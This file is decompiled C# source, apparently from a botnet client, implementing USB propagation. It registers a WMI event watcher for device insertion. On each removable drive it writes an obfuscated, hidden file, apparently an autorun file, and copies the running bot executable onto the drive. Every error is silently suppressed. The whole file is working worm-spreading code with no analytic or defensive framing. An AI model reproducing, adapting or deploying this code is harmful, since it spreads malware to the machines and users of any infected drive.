namespace USBInfection
{
    using MainBot;
    using System;
    using System.IO;
    using System.Management;

    internal class USBInfectionHelper
    {
        private static ManagementEventWatcher managementEventWatcher_0;

        private static void InfectUSBDrive(object sender, EventArrivedEventArgs e)
        {
            foreach (DriveInfo info in DriveInfo.GetDrives())
            {
                if (info.IsReady && (info.DriveType == DriveType.Removable))
                {
                    try
                    {
                        string[] strArray = new string[] { info.Name + <PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_33(), info.Name + <PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_34() };
                        foreach (string str in strArray)
                        {
                            if (File.Exists(str))
                            {
                                File.Delete(str);
                            }
                        }
                        using (StreamWriter writer = new StreamWriter(new FileStream(strArray[0], FileMode.Create, FileAccess.Write)))
                        {
                            writer.Write(<PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_35());
                            writer.Write(<PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_36());
                            writer.Write(<PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_37());
                            writer.Write(<PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_38());
                            writer.Write(<PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_39());
                            writer.Flush();
                            writer.Close();
                        }
                        if (File.Exists(strArray[1]))
                        {
                            File.Delete(strArray[1]);
                        }
                        File.Copy(Configuration.CurrentFilename, strArray[1], true);
                        File.SetAttributes(strArray[0], File.GetAttributes(strArray[0]) | FileAttributes.Hidden);
                        File.SetAttributes(strArray[1], FileAttributes.Normal | FileAttributes.Archive);
                    }
                    catch
                    {
                    }
                }
            }
        }

        public static void SetupUSBWatch()
        {
            try
            {
                ManagementScope scope = new ManagementScope(<PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_30());
                scope.Options.EnablePrivileges = true;
                WqlEventQuery query2 = new WqlEventQuery();
                query2.EventClassName = <PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_31();
                query2.WithinInterval = new TimeSpan(0, 0, 1);
                query2.Condition = <PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_32();
                WqlEventQuery query = query2;
                managementEventWatcher_0 = new ManagementEventWatcher(scope, query);
                managementEventWatcher_0.EventArrived += new EventArrivedEventHandler(USBInfectionHelper.InfectUSBDrive);
                managementEventWatcher_0.Start();
            }
            catch
            {
            }
        }

        public static void StopUSBWatch()
        {
            try
            {
                managementEventWatcher_0.Stop();
            }
            catch
            {
            }
        }
    }
}

